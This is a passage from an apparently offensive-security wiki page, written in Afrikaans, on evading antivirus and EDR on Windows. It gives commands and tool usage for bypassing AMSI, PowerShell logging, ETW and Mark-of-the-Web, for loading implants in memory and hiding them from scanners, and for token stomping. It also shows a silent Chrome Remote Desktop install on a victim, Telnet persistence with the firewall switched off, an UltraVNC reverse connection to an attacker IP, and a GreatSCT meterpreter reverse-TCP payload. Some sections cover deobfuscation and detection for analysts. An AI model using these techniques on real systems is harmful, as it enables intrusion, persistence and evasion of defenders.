Jy kan ’n hulpmiddel soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die bespeurde AMSI-handtekening uit die geheue van die huidige proses te verwyder. Hierdie hulpmiddel werk deur die geheue van die huidige proses vir die AMSI-handtekening te skandeer en dit dan met NOP-instruksies te oorskryf, wat dit effektief uit die geheue verwyder.

**AV/EDR-produkte wat AMSI gebruik**

Jy kan ’n lys van AV/EDR-produkte wat AMSI gebruik vind by **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Gebruik PowerShell-weergawe 2**
As jy PowerShell-weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou scripts kan uitvoer sonder dat AMSI dit skandeer. Jy kan dit so doen:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell-logging is ’n funksie waarmee jy alle PowerShell-opdragte wat op ’n stelsel uitgevoer word, kan aanteken. Dit kan nuttig wees vir ouditering en foutopsporing, maar dit kan ook ’n **probleem wees vir aanvallers wat opsporing wil vermy**.

Om PowerShell-logging te omseil, kan jy die volgende tegnieke gebruik:

- **Deaktiveer PowerShell Transcription en Module Logging**: Jy kan ’n hulpmiddel soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Gebruik PowerShell weergawe 2**: As jy PowerShell weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder dat AMSI dit skandeer. Jy kan dit so doen: `powershell.exe -version 2`
- **Gebruik ’n onbeheerde PowerShell-sessie**: Gebruik [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om PowerShell te huisves sonder om `powershell.exe` te begin (die benadering wat Cobalt Strike se `powerpick` gebruik). Dit omseil kontroles wat spesifiek aan die `powershell.exe`-proses gekoppel is, maar deaktiveer nie vanselfsprekend AMSI, Script Block Logging of alle ander PowerShell-verdedigingsmaatreëls nie; dekking hang af van die runtime- en gasheerimplementering.


## Obfuskasie

> [!TIP]
> Verskeie obfuskasietegnieke maak staat op die enkripsie van data, wat die binêre lêer se entropie verhoog en dit vir AV’s en EDR’s makliker maak om dit op te spoor. Wees versigtig hiermee en pas enkripsie dalk net toe op spesifieke gedeeltes van jou kode wat sensitief is of versteek moet word.

### Deobfuskering van ConfuserEx-beskermde .NET-binêre lêers

Wanneer jy wanware ontleed wat ConfuserEx 2 (of kommersiële vertakkings) gebruik, is dit algemeen om verskeie beskermingslae teë te kom wat dekompileerders en sandboxes sal blokkeer. Die werkvloei hieronder **herstel betroubaar ’n byna oorspronklike IL** wat daarna na C# gedekomileer kan word met nutsgoed soos dnSpy of ILSpy.<sup>[[10]](#references)</sup>

1.  Verwydering van anti-peuterbeskerming – ConfuserEx enkripteer elke *metodeliggaam* en dekripteer dit binne die *module* se statiese konstruktor (`<Module>.cctor`). Dit herstel ook die PE-kontrolesom, sodat enige wysiging die binêre lêer sal laat omval. Gebruik **AntiTamperKiller** om die geënkripteerde metadatatafels op te spoor, die XOR-sleutels te herwin en ’n skoon assembly te herskryf:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Uitvoer bevat die 6 anti-tamper-parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Simbool-/beheervloeiherwinning – voer die *skoon* lêer aan **de4dot-cex** (’n ConfuserEx-bewuste fork van de4dot).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Vlae:
     • `-p crx` – kies die ConfuserEx 2-profiel
     • de4dot sal control-flow flattening ongedaan maak, oorspronklike naamruimtes, klasse en veranderlikename herstel, en konstantestrings dekripteer.

3.  Proxy-call-verwydering – ConfuserEx vervang direkte metode-aanroepe met liggewig-omhulsels (ook bekend as *proxy calls*) om dekompilering verder te bemoeilik. Verwyder hulle met **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Ná hierdie stap behoort jy normale .NET API's soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van ondeursigtige omhulselfunksies (`Class8.smethod_10`, …).

4.  Handmatige opruiming – voer die resulterende binêre lêer onder dnSpy uit en soek na groot Base64-blokke of gebruik van `RijndaelManaged`/`TripleDESCryptoServiceProvider` om die *werklike* payload op te spoor. Dikwels stoor die malware dit as ’n TLV-geënkodeerde byte-skikking wat binne `<Module>.byte_0` geïnisialiseer word.

Bogenoemde ketting herstel die uitvoeringsvloei **sonder** dat die kwaadwillige sample uitgevoer hoef te word – nuttig wanneer jy op ’n vanlyn werkstasie werk.

> 🛈  ConfuserEx skep ’n pasgemaakte attribuut met die naam `ConfusedByAttribute` wat as ’n IOC gebruik kan word om samples outomaties te triage.

#### Eenreëlige opdrag
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om ’n oopbron-vurk van die [LLVM](http://www.llvm.org/)-kompileringsuite te verskaf wat verhoogde sagtewaresekuriteit kan bied deur middel van [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en peuterbeskerming.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe die `C++11/14`-taal gebruik kan word om tydens samestelling geobfuskeerde code te genereer, sonder om enige eksterne nutsmiddel te gebruik of die compiler te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg ’n laag geobfuskeerde bewerkings by wat deur die C++-template-metaprogrammeringsraamwerk gegenereer word, wat die lewe vir iemand wat die toepassing wil kraak ’n bietjie moeiliker sal maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is ’n x64-binary-obfuscator wat verskillende PE-lêers kan obfuskeer, insluitend: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is ’n eenvoudige metamorfiese code-enjin vir arbitrêre uitvoerbare lêers.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is ’n fynkorrelige code-obfuskasieraamwerk vir LLVM-ondersteunde tale wat ROP (return-oriented programming) gebruik. ROPfuscator obfuskeer ’n program op die assembly-code-vlak deur gewone instruksies in ROP-chains te omskep, wat ons natuurlike opvatting van normale beheer vloei verydel.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is ’n .NET PE Crypter wat in Nim geskryf is
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL-lêers in shellcode omskep en dit dan laai

### LLVM compiler-gesteunde selfmaskering per funksie

In plaas daarvan om ’n hele implant slegs te masker terwyl dit slaap, kan ’n gewysigde LLVM X86-backend geselekteerde funksies XOR-gemasker hou wanneer hulle onaktief is. Die Function Peekaboo PoC kies gedemanglede name wat `REG_` bevat, voeg posisie-onafhanklike entry-/exit-stubs om die finale masjiencode in, en plaas een gedeelde masking handler in `.text`; handtekeninge op broncodevlak en die Windows x64 calling convention bly onveranderd.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend-beheervloeitransformasie

Dit hoort ná instruksiekeuse en -optimering, omdat die transformasie **elke gegenereerde return** moet dek en die presiese x86-uitleg moet ken. ’n `MachineFunctionPass` voor uitset soek die laaste `MachineInstr::isReturn()`, verwyder dit sodat die finale pad in die bygevoegde epiloog val, en vervang vroeëre returns met `JMP_1 handler`. Behou enige compiler-gegenereerde stack-/frame-afbreking wat voor elke return kom; herlei slegs die return-instruksie self.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` en `emitFunctionBodyEnd()` stuur die per-funksie-stubs uit, terwyl `emitEndOfAsmFile()` die handler uitstuur. Simbole wat tussen uitsetstadiums gedeel word, laat ’n proloog-vertakking na sy latere epiloog spring; skryf vir ’n handmatig uitgestuurde nabygeleë `je` `0F 84`, gevolg deur die vier-byte MC-uitdrukking `target - address_after_je`. Oproepe en spronge na die handler kan eerder as `MCInst`-objekte (`CALL64pcrel32` en `JMP_1`) uitgestuur word. ’n Pass moet `false` teruggee vir ’n ongekose funksie wanneer niks verander is nie; die PoC gee verkeerdelik `true` op daardie pad terug.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata en voor-CRT-inisialisering

Die PoC plaas ’n XOR-sleutel en 16-byte-rekords met ’n deur die loader herlokeerde funksiewyser plus ’n runtime-lengte in `.funcmeta`. Hoewel die C-veld ’n `uint32_t` is, lees die handler ’n QWORD by rekordoffset `+8`, wat die lengte en sy padding verbruik, en vorder rekords met `0x10` op. PE-afdelingsname is net agt bytes lank, dus sien die runtime-opsoek `.funcmet`. ’n Eksterne patcher voeg ’n uitvoerbare `.stub` by, stoor die ou entry-point-RVA in die stub en herlei `AddressOfEntryPoint`; die PIC-stub verkry die image base vanaf `gs:[0x60]` → `[PEB+0x10]`, loop deur PE32+-imports om ’n reeds ingevoerde `VirtualProtect` op te los, en loop voor die CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Inisialisering stel ’n sentinel in `gs:[0xE8]` en roep elke metadata-funksie aan. Sy permanent leesbare proloog teken die funksiebegin in `gs:[0xF0]` aan, bespeur die sentinel en slaan die steeds ongewysigde liggaam oor. Die epiloog gebruik dan `call handler`; nadat die handler 13 registers (`0x68` bytes) gestoor het, is die return-adres by `[rsp+0x68]` die einde van die getransformeerde funksie, sodat `end - start` na sy metadata-rekord geskryf kan word. Die stub maak die sentinel skoon en spring na `ImageBase + original_entry_point_RVA` nadat al die liggame gemasker is.<sup>[[38]](#references)[[39]](#references)</sup>

Tydens ’n normale oproep roep die proloog dieselfde simmetriese handler aan om die liggaam te dekodeer. Die finale pad val in die bygevoegde epiloog, terwyl elke vroeëre return regstreeks na die gedeelde handler spring. Die normale epiloog gebruik ook `jmp handler` eerder as `call`, sodat die handler se `ret` die oorspronklike oproeper se return-adres verbruik nadat die liggaam weer gemasker is, en die funksieresultaat in `RAX` behoue bly.<sup>[[38]](#references)[[39]](#references)</sup>

#### Maskeringsprimitief en ontledingsaanwysers

Die handler vind die huidige rekord, slaan die vaste sigbare proloog (`0x46` bytes in hierdie build) oor, verander die res na `PAGE_EXECUTE_READWRITE`, XOR dit byte vir byte met die lae sleutelbyte, en stel dit dan op `PAGE_EXECUTE_READ`. Dieselfde lus dekodeer dus met ingang en enkodeer met elke normale uitgang.<sup>[[38]](#references)[[39]](#references)</sup>

Aanwysers met ’n hoë seinwaarde vir hierdie ontwerp sluit in:<sup>[[38]](#references)[[39]](#references)</sup>

- ’n entry point binne ’n uitvoerbare `.stub` en ’n `.funcmet`-afdeling met ’n sleutel plus herlokeerde `.text`-wysers;
- PEB-, import-table- en section-table-ontleding voor die CRT, gevolg deur oproepe deur elke metadata-wyser;
- identiese `call`/`pop` PIC-proloë en baie return-punte wat na een handler herlei word;
- skrywe na `gs:[0xE8]`, `gs:[0xF0]` en `gs:[0xF8]`, gevolg deur herhaalde `VirtualProtect`-oorgange en byte-vir-byte XOR-skrywes na beeldgesteunde uitvoerbare bladsye.

Dit is ontduiking van geheueskandeerders, nie kriptografiese beskerming nie: die gelapte lêer bevat steeds die oorspronklike ongewysigde liggaam, en ’n debugger kan op `VirtualProtect` of die XOR-lus breek en die aktiewe funksie dump. Die enkelbyte-XOR, leesbare metadata en vaste `0x46`-grens maak herstel vanlyn ook eenvoudig.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Die PoC se TEB-gleuwe is draadplaaslik, maar die gewysigde code-bladsye is proseswyd. Gelyktydige of rekursiewe toegang kan instruksies dus weer omskakel terwyl ’n ander aanroep dit uitvoer; uitsonderings en nie-plaaslike uitgange kan ook hermaskering omseil. ’n Robuuste implementering moet oorgange sinkroniseer, die beskerming herstel wat werklik via `lpflOldProtect` teruggegee is, hardgekodeerde stub-lengtes vermy, beide `call`- en `jmp`-paaie vir x64-stackbelyning oudit, en `FlushInstructionCache` aanroep nadat uitvoerbare bytes herskryf is. Microsoft maak die oproeper uitdruklik verantwoordelik vir instruksie-kas-koherensie wanneer uitvoerbare code gewysig word.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Jy het dalk hierdie skerm gesien wanneer jy sommige uitvoerbare lêers van die internet aflaai en uitvoer.

Microsoft Defender SmartScreen is ’n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die uitvoer van moontlik kwaadwillige toepassings.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik met ’n reputasiegebaseerde benadering, wat beteken dat toepassings wat selde afgelaai word SmartScreen sal aktiveer, en sodoende die eindgebruiker waarsku en verhoed om die lêer uit te voer (hoewel die lêer steeds uitgevoer kan word deur More Info -> Run anyway te klik).

**MoTW** (Mark of The Web) is ’n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier, wat outomaties geskep word wanneer lêers van die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir ’n lêer wat van die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om daarop te let dat uitvoerbare lêers wat met ’n **trusted** signing certificate onderteken is, **nie SmartScreen sal aktiveer nie**.

’n Baie doeltreffende manier om te keer dat jou payloads die Mark of The Web kry, is om hulle in ’n soort houer, soos ’n ISO, te verpak. Dit gebeur omdat Mark-of-the-Web (MOTW) **nie** op **nie-NTFS**-volumes toegepas **kan word nie**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is ’n nutsmiddel wat payloads in uitvoerhouers verpak om Mark-of-the-Web te ontduik.

Voorbeeldgebruik:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hier is ’n demo vir die omseiling van SmartScreen deur payloads in ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is ’n kragtige loggingmeganisme in Windows waarmee toepassings en stelselkomponente **gebeurtenisse kan log**. Sekuriteitsprodukte kan dit egter ook gebruik om kwaadwillige aktiwiteite te monitor en op te spoor.

Net soos AMSI gedeaktiveer (omseil) word, is dit ook moontlik om die **`EtwEventWrite`**-funksie van die gebruikersruimteproses onmiddellik te laat terugkeer sonder om enige gebeurtenisse te log. Dit word gedoen deur die funksie in geheue te patch sodat dit onmiddellik terugkeer, wat ETW-logging vir daardie proses effektief deaktiveer.

Jy kan meer inligting vind by **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) en [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Die laai van C#-binaries in geheue is al ’n geruime tyd bekend, en dit is steeds ’n baie goeie manier om jou post-exploitation-tools uit te voer sonder om deur AV opgespoor te word.

Aangesien die payload direk in geheue gelaai word sonder om aan skyf te raak, hoef ons net bekommerd te wees oor die patching van AMSI vir die hele proses.

Die meeste C2-frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C#-assemblies direk in geheue uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels **die skep van ’n nuwe offerproses**, die inspuiting van jou kwaadwillige post-exploitation-kode in daardie nuwe proses, die uitvoering van jou kwaadwillige kode en, wanneer dit klaar is, die beëindiging van die nuwe proses. Dit hou voordele sowel as nadele in. Die voordeel van die fork and run-metode is dat uitvoering **buite** ons Beacon-implant-proses plaasvind. Dit beteken dat as iets tydens ons post-exploitation-aksie verkeerd loop of opgespoor word, daar ’n **veel groter kans** is dat ons **implant sal oorleef.** Die nadeel is dat jy ’n **groter kans** het om deur **Behavioural Detections** opgespoor te word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit behels dat die kwaadwillige post-exploitation-kode **in sy eie proses** ingespuit word. Só kan jy vermy om ’n nuwe proses te skep en dit deur AV te laat skandeer, maar die nadeel is dat as iets tydens die uitvoering van jou payload verkeerd loop, daar ’n **veel groter kans** is dat jy jou **beacon verloor**, aangesien dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer oor die laai van C#-assemblies wil lees, kyk gerus na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C#-assemblies **vanuit PowerShell** laai. Kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t se video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## NativeAOT WebAssembly-herverpakking van .NET-tools (WasmForge)

Gewone `execute-assembly`-tegnieke behou herkenbare MSIL en inisieer uiteindelik ’n CLR. **WasmForge** verander eerder die uitvoeringslaag: dit migreer ’n C#-projek na die eksperimentele NativeAOT-LLVM WASI-teiken, compileer dit vooraf na WebAssembly en sluit daardie module in ’n Wazero-gebaseerde Windows PE-host in. Die resulterende proses benodig nie die teiken se CLR, JIT of `dotnet`-host nie, daarom verloor reëls wat slegs op managed assembly-name, CLR-laai, AMSI of .NET ETW gebaseer is, direkte sigbaarheid. Dit is ’n evasion-/verpakkingstegniek, nie ’n omseiling van ’n voorreggrens nie—die guest behou die oorspronklike tool se toestemmings en waarneembare OS-gedrag.<sup>[[44]](#references)[[45]](#references)</sup>

### Bou van ’n C#-projek

Die aanbevole boumetode is die projek se Docker-omgewing, omdat dit die .NET 10 SDK, NativeAOT-LLVM-workload, WASI SDK 24.0, linker en afhanklikhede vir ondertekening insluit. ’n `.csproj` word outomaties opgespoor; die eenmalige bouproses voer migrasie, versoenbaarheidspatching, WASM-kompilering, PE-smee en ondertekening uit.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Vir foutopsporing of hersiening van gegenereerde kode, verdeel die proses in `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` en ’n finale `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Die build-image gebruik ook ’n `wasm-component-ld`-wrapper om die WASI Preview 2-komponentenkodering te vermy en die gewone module te produseer wat die ingebedde runtime verwag.<sup>[[44]](#references)[[45]](#references)</sup>

### Oorbrugging van wasm32 C# na x64 Win32

Dit is nie ’n deursigtige herkompilering nie. NativeAOT-WASI het nie Windows-gerigte BCL-funksies nie, of verander hulle, en ’n wasm32-guest ken gewoonlik viergreep-aanwysergleuwe toe, terwyl x64-API’s agtgreep-aanwysers kan teruggee. WasmForge pak albei probleme aan met die volgende gegenereerde lae:<sup>[[44]](#references)</sup>

1. ’n Bron-patcher herstel AOT-spesifieke semantiese verskille en herlei onondersteunde registry-, pipes-, WMI-, identity-, directory-service-, file-version-, LSA- en soortgelyke oproepe na `Wf*`-helpers.
2. ’n P/Invoke-skandeerder genereer NativeAOT `DirectPInvoke`-karterings sodat `[DllImport]`-oproepe aan gekoppelde C-bridge-simbole bind, eerder as om die verklaarde DLL dinamies binne die guest te laai.
3. Aanwysers wat aan die host gebind is, gebruik `ulong` in C# en `uint64_t` in C. ’n Generiese dispatcher stuur die oproep aan die host se Win32-handler; ’n `out8_mask` merk egte agtgreep-uitsetgleuwe waarvan die boonste helftes behou moet word. Ongemerkte wasm32-vormige uitsette gebruik snapshot/restore-beskerming sodat ’n x64-skrywing nie die aangrensende vier grepe kan beskadig nie.
4. Toegewyde host-bridges hanteer bewerkings wat nie by generiese syscall-dispatch pas nie, soos toegang tot LSA-ticket-cache, Kerberos/BCrypt-bewerkings met gestruktureerde resultate, TCP KDC-verkeer en LDAP-navrae.

Byvoorbeeld, ’n wrapper vir `version.dll!VerQueryValueW` stuur vier host-adresse deur en stel bisse 2 en 3 (`0xC`) omdat die waarde-aanwyser en lengte agtgreep-uitsetgleuwe is. Die wrapper self bly generies en delegeer die DLL-naam, export-naam, argumente en masker aan `wf_call_v2`; die host vertaal aanwysers en roep die native API aan.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Beperkings en opsporingspivots

Kode wat swaar op reflection staatmaak, dinamiese assembly-laaiing, arbitrêre native callbacks en komplekse x64-strukture wat na WASM-geheue teruggestuur word, kan steeds pleisterwerk vir elke hulpmiddel vereis of heeltemal misluk. Generiese WASI Preview 2-sockets kan ook no-op-stubs bereik, daarom gebruik ondersteunde hulpmiddels protokolspesifieke host shims. Valideer elke opdrag teen ’n native build eerder as om aan te neem dat funksionaliteit ooreenstem.<sup>[[44]](#references)[[45]](#references)</sup>

Die tegniek verskuif telemetrie eerder as om die payload onsigbaar te maak. Opsporing kan fokus op ’n PE wat ’n WASM-module bevat of materialiseer, Wazero-agtige runtime-gedrag, ongewone host/guest-geheue-toewysing en -kopiëring, generiese direkte Win32-versending, afwykings in ondertekening en PE-hulpbronne, asook die gevolglike API-oproepe en netwerkverkeer. Die afwesigheid van CLR-load-, AMSI- of .NET ETW-gebeurtenisse moet dus nie as bewys beskou word dat ’n proses goedaardig is nie.<sup>[[44]](#references)</sup>

## Gebruik van ander programmeertale

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode met ander tale uit te voer deur die gekompromitteerde masjien toegang te gee **tot die interpreter-omgewing wat op die SMB-share onder beheer van die aanvaller geïnstalleer is**.

Deur toegang tot die Interpreter Binaries en die omgewing op die SMB-share toe te laat, kan jy **arbitrêre kode in hierdie tale binne die geheue** van die gekompromitteerde masjien uitvoer.

Die repo dui aan: Defender skandeer steeds die scripts, maar deur Go, Java, PHP, ens. te gebruik, het ons **meer buigsaamheid om statiese handtekeninge te omseil**. Toetse met ewekansige, nie-geobfuskeerde reverse shell-scripts in hierdie tale was suksesvol.

## WebAssembly-herhuisvesting om statiese-analise-ontduiking te bewerkstellig

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuleer die access token van ’n sekuriteitsproduk soos ’n EDR of AV. Deur die token se voorregte te verminder, kan die proses aanhou loop terwyl dit verhinder word om bevoorregte inspeksie- of remediëringsaksies uit te voer.

Om dit te voorkom, kan Windows **verhoed dat eksterne prosesse** handles na die tokens van sekuriteitsprosesse kry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Gebruik van vertroude sagteware

### Chrome Remote Desktop

Soos beskryf in [**hierdie blogplasing**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om Chrome Remote Desktop op ’n slagoffer se rekenaar te ontplooi en dit dan te gebruik om beheer daaroor te verkry en volharding te handhaaf:<sup>[[35]](#references)</sup>
1. Laai dit af vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
2. Voer die installeerder stilweg op die slagoffer se masjien uit (admin word vereis): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop-bladsy en klik op next. Die towenaar sal jou dan vra om te magtig; klik op die Authorize-knoppie om voort te gaan.
4. Voer die verskafte opdrag met die nodige aanpassings uit: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (die `--pin`-parameter stel die PIN sonder om die GUI te gebruik).
 

## Gevorderde ontduiking

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Ontduiking is ’n baie ingewikkelde onderwerp; soms moet jy baie verskillende bronne van telemetrie in net een stelsel in ag neem, dus is dit feitlik onmoontlik om in volwasse omgewings heeltemal onopgespoor te bly.

Elke omgewing waarteen jy te staan kom, sal sy eie sterk- en swakpunte hê.

Ek moedig jou sterk aan om hierdie praatjie deur [@ATTL4S](https://twitter.com/DaniLJ94) te kyk om ’n vastrapplek in meer gevorderde ontduikingstegnieke te kry.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dit is ook nog ’n uitstekende praatjie deur [@mariuszbit](https://twitter.com/mariuszbit) oor ontduiking in diepte.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Ou tegnieke**

### **Kyk watter dele Defender as kwaadwillig beskou**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik, wat **dele van die binêre lêer sal verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig beskou, en dit vir jou afsonder.\
Nog ’n hulpmiddel wat **dieselfde doen, is** [**avred**](https://github.com/dobin/avred), met ’n openbare webdiens by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet-bediener**

Tot en met Windows 10 het alle Windows-weergawes ’n **Telnet-bediener** ingesluit wat jy (as administrateur) kon installeer deur die volgende uit te voer:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Laat dit **begin** wanneer die stelsel aangeskakel word en **voer** dit nou uit:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Verander telnet-poort** (stealth) en deaktiveer firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Laai dit af van: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin-aflaaie hê, nie die installasieprogram nie)

**OP DIE GASHEER**: Voer _**winvnc.exe**_ uit en stel die bediener op:

- Aktiveer die opsie _Disable TrayIcon_
- Stel ’n wagwoord in by _VNC Password_
- Stel ’n wagwoord in by _View-Only Password_

Skuif dan die binêre lêer _**winvnc.exe**_ en die **nuut** geskepte lêer _**UltraVNC.ini**_ na die **slagoffer**

#### **Omgekeerde verbinding**

Die **aanvaller** moet die binêre lêer `vncviewer.exe -listen 5900` **op sy eie gasheer uitvoer**, sodat dit gereed is om ’n omgekeerde **VNC-verbinding** te ontvang. Voer dan op die **slagoffer** die winvnc-daemon uit met `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit.

**WAARSKUWING:** Om onopvallend te bly, moet jy ’n paar dinge nie doen nie

- Moenie `winvnc` begin as dit reeds loop nie, anders sal jy ’n [opspringvenster](https://i.imgur.com/1SROTTl.png) veroorsaak. Kyk of dit loop met `tasklist | findstr winvnc`
- Moenie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie, anders sal [die konfigurasievenster](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moenie `winvnc -h` vir hulp uitvoer nie, anders sal jy ’n [opspringvenster](https://i.imgur.com/oc18wcu.png) veroorsaak

### GreatSCT

Laai dit af van: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Binne GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Begin nou **die listener** met `msfconsole -r file.rc` en **voer** die **xml payload** uit met:

```
